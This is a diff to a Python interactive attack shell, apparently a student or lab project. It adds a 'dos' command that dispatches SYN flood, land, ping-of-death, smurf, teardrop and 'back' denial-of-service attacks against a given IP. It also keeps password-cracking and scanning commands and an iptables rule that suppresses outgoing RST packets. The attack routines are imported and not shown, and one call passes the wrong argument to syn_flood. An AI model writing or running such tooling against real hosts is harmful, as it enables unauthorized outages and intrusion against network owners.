@@ -1,12 +1,13 @@
 #!/usr/bin/python3
 from options import *
 from isvalid import *
-from denial_of_service import syn_flood
+from denial_of_service import *
 from password_file_cracker import *
 from os import geteuid, popen, getcwd, mkdir
 from os.path import exists, isfile
 import subprocess
 import sys
+from extra import *
 
 
 def parse_args(args, not_batch_mode=True):
@@ -37,13 +38,6 @@ def parse_args(args, not_batch_mode=True):
         elif args[0] == "scan":
             if len(args) == 2 and valid_ip(args[1]):
                 network_scan(args[1])
-
-        elif args[0] == "dos":
-            print("ABOUT TO FLOOD")
-            if len(args) == 3 and valid_ip(args[1]) and valid_port(args[2], True):
-                syn_flood(args[1], args[2])
-            else:
-                print("usage: dos <Target IP> <Port Number>")
 
         elif args[0] == "crack-host":
             # By default attack andrew:
@@ -142,6 +136,36 @@ def parse_args(args, not_batch_mode=True):
         return
 
 
+# This contains all stuff to execute DOS attacks
+def parse_dos(args):
+    try:
+        if args[1] == "syn":
+            if valid_ip(args[2]) and valid_port(args[3], dos=True):
+                syn_flood(args[1], args[2])
+            else:
+                print("usage: dos syn <Target IP> <Port Number>")
+
+        # Technically this is more application layer kind of attack...
+        elif args[1] == "back" and valid_ip(args[2]):
+            back(args[2], payload="../index.html")
+
+        elif args[1] == "land" and valid_ip(args[2]) and valid_port(args[3], dos=True):
+            land(args[2], args[3])
+
+        elif args[1] == "pod" and valid_ip(args[2]):
+            pod(args[2])
+
+        elif args[1] == "smurf" and valid_ip(args[2]):
+            smurf(args[2], args[2])
+
+        elif args[1] == "teardrop" and valid_ip(args[2]) and (args[3] == '0' or args[3] == '1' or args[3] == '2' or args[3] == '3' or args[3] == '4'):
+            teardrop(args[2], args[3])
+
+    except IndexError:
+        print("Index out of bounds!")
+        return
+
+
 def main():
 
     if geteuid() != 0:
@@ -156,7 +180,8 @@ def main():
     # For TCP Handshake to work correctly, I need to modify IP Tables
     # sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <SOURCE IP> -j DROP
     source_ip = popen("hostname -I").read()
-    update_table = ["sudo", "iptables", "-A", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-s", source_ip.rstrip(), "-j", "DROP"]
+    update_table = ["sudo", "iptables", "-A", "OUTPUT", "-p", "tcp", "--tcp-flags", "RST", "RST", "-s",
+                    source_ip.rstrip(), "-j", "DROP"]
     subprocess.call(update_table)
 
     # An option supported by this is to read a text file and execute all commands as if it were fed on the shell
@@ -165,8 +190,9 @@ def main():
         with open(sys.argv[1], "r") as file:
             for line in file:
                 args = line.split()
-                parse_args(args)
-
+                # parse_args(args)
+                parse_dos(args)
+        
     while True:
         try:
             var = input("Shell> ")
@@ -174,6 +200,8 @@ def main():
 
             if len(args) == 1 and args[0] == "exit":
                 break
+            if args[0] == "dos":
+                parse_dos(args)
             # This also takes case of when no arguments are inputted as well!
             else:
                 parse_args(args)
@@ -184,10 +212,6 @@ def main():
 
         except KeyboardInterrupt:
             print("Interrupt detected --closing--")
-            break
-
-        except Exception:
-            print("Unknown Exception --closing--")
             break
 
     # Revert changes to IP Table!
